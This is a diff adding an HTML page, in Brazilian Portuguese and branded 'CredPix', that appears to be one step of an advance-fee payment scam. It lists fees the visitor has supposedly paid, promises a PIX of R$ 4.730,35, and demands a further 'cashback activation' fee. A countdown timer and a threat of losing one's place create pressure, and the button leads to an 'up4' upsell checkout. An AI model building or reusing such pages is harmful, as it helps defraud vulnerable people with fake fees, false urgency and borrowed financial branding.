@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <title>Confirmação Final do PIX</title>
+    <meta name="credpix-base-title" content="Confirmação Final do PIX">
+<script src="../assets/js/links.js"></script>
+<meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <script src="../assets/js/credpix-upsell-init.js"></script>
+<link rel="stylesheet" href="../assets/css/tailwind.css">
+
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+
+<body class="bg-gray-50">
+
+<header class="bg-[#1B5E20] border-b border-[#145A14] shadow-sm">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+    <div class="flex justify-between items-center h-20">
+      <div class="flex items-center">
+        <img src="../assets/img/credpix-logo.png" alt="CredPix" class="h-8 md:h-10">
+      </div>
+    </div>
+  </div>
+</header>
+
+  <main class="py-8 px-4 md:py-12">
+    <div class="max-w-2xl mx-auto">
+      <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 fade-in">
+
+        <div class="bg-gradient-to-r from-green-500 to-green-600 text-white text-center py-6 px-6 rounded-xl mb-6">
+          <h1 class="text-2xl font-bold mb-2">Confirmação Final do PIX</h1>
+          <p class="text-lg">Ative seu cashback e receba o valor total</p>
+        </div>
+
+        <div class="bg-gray-50 border border-gray-200 rounded-xl p-5 mb-6">
+          <h3 class="font-semibold text-gray-900 mb-4 text-center">Resumo de Pagamentos</h3>
+
+          <div class="space-y-3 mb-4">
+            <div class="flex justify-between py-3 border-b border-gray-200">
+              <span class="text-gray-600">Tarifa do Seguro Allianz</span>
+              <span class="font-semibold text-gray-900">R$ 39,86</span>
+            </div>
+            <div class="flex justify-between py-3 border-b border-gray-200">
+              <span class="text-gray-600">Tarifa IOF</span>
+              <span class="font-semibold text-gray-900">R$ 30,90</span>
+            </div>
+            <div class="flex justify-between py-3 border-b border-gray-200">
+              <span class="text-gray-600">Verificação do IOF</span>
+              <span class="font-semibold text-gray-900">R$ 26,90</span>
+            </div>
+            <div class="flex justify-between py-3 border-b border-gray-200">
+              <span class="text-gray-600">Tarifa de Segurança</span>
+              <span class="font-semibold text-gray-900">R$ 19,87</span>
+            </div>
+          </div>
+
+          <div class="bg-mp-light-blue border-2 border-mp-blue rounded-lg p-4 flex justify-between items-center">
+            <span class="font-bold text-gray-900">Total pago:</span>
+            <span class="text-xl font-bold text-red-600">R$ 117,53</span>
+          </div>
+
+          <div class="bg-green-50 border-2 border-green-500 rounded-lg p-4 mt-3 flex justify-between items-center">
+            <span class="font-bold text-gray-900">Valor a receber:</span>
+            <span id="valorReceber" class="text-2xl font-bold text-green-600">R$ 4.730,35</span>
+          </div>
+        </div>
+
+        <div class="bg-gradient-to-r from-teal-50 to-cyan-50 border-2 border-teal-500 rounded-xl p-6 mb-6">
+          <h3 class="text-xl font-bold text-teal-900 mb-3 text-center">Ativação do Cashback</h3>
+          <div class="text-4xl font-bold text-teal-600 text-center my-4">R$ 33,43</div>
+          <p class="text-teal-900 text-center">
+            Para liberar o valor total e receber de volta todas as taxas pagas, é necessário confirmar a ativação do Cashback no valor de R$ 33,43 (1%).
+          </p>
+        </div>
+
+        <ul class="space-y-3 mb-6">
+          <li class="flex items-center gap-3 text-gray-700 py-2 border-b border-gray-100">
+            <div class="flex-shrink-0 w-6 h-6 bg-green-100 rounded-full flex items-center justify-center">
+              <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+              </svg>
+            </div>
+            <span id="pixValor">PIX de R$ 4.730,35 será enviado ao seu app</span>
+          </li>
+
+          <li class="flex items-center gap-3 text-gray-700 py-2 border-b border-gray-100">
+            <div class="flex-shrink-0 w-6 h-6 bg-green-100 rounded-full flex items-center justify-center">
+              <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+              </svg>
+            </div>
+            <span>Notificação via WhatsApp e E-mail</span>
+          </li>
+
+          <li class="flex items-center gap-3 text-gray-700 py-2 border-b border-gray-100">
+            <div class="flex-shrink-0 w-6 h-6 bg-green-100 rounded-full flex items-center justify-center">
+              <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+              </svg>
+            </div>
+            <span>Fim de fila: nada mais será cobrado</span>
+          </li>
+
+          <li class="flex items-center gap-3 text-gray-700 py-2">
+            <div class="flex-shrink-0 w-6 h-6 bg-green-100 rounded-full flex items-center justify-center">
+              <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+              </svg>
+            </div>
+            <span>Processo finalizado em até 3 minutos</span>
+          </li>
+        </ul>
+
+        <div class="bg-gray-900 text-white rounded-xl p-5 mb-6 text-center">
+          <div class="text-sm mb-2">Valor reservado por:</div>
+          <div class="text-3xl font-bold font-mono pulse-animation" id="countdown">07:00</div>
+        </div>
+
+        <button
+          type="button" data-credpix-checkout="up4" onclick="redirect('up4')"
+          class="w-full bg-teal-600 text-white py-4 rounded-lg text-lg font-semibold hover:bg-teal-700 hover:shadow-lg transition-all mb-4">
+          Ativar cashback agora
+        </button>
+
+        <div class="bg-red-50 border-2 border-red-500 rounded-xl p-4 text-center">
+          <div class="text-sm font-bold text-red-800 mb-1">Último passo</div>
+          <p class="text-sm text-red-700">Se não concluir, sua vaga será repassada para o próximo da fila!</p>
+        </div>
+
+      </div>
+    </div>
+  </main>
+
+<footer class="bg-[#1B5E20] border-t border-[#145A14] mt-auto">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+    <div class="flex flex-col items-center justify-center text-center space-y-4">
+      <img src="../assets/img/credpix-logo.png" alt="CredPix" class="h-12 md:h-14 mx-auto">
+      <div class="text-sm text-white space-y-1">
+        <p>Simplic © 2025 Instituição Financeira</p>
+        <p>CNPJ: 33.030.944/0001-60</p>
+      </div>
+    </div>
+  </div>
+</footer>
+<script src="../assets/js/main.js" defer></script>
+  <script src="../assets/js/preload-pix.js" defer></script>
+
+  <script>
+    let countdownTime = 420;
+    const countdownEl = document.getElementById('countdown');
+
+    const timer = setInterval(() => {
+      countdownTime--;
+      const minutes = Math.floor(countdownTime / 60);
+      const seconds = countdownTime % 60;
+
+      countdownEl.textContent =
+        `${minutes < 10 ? '0' : ''}${minutes}:` +
+        `${seconds < 10 ? '0' : ''}${seconds}`;
+
+      if (countdownTime <= 0) {
+        clearInterval(timer);
+        countdownEl.textContent = 'EXPIRADO';
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
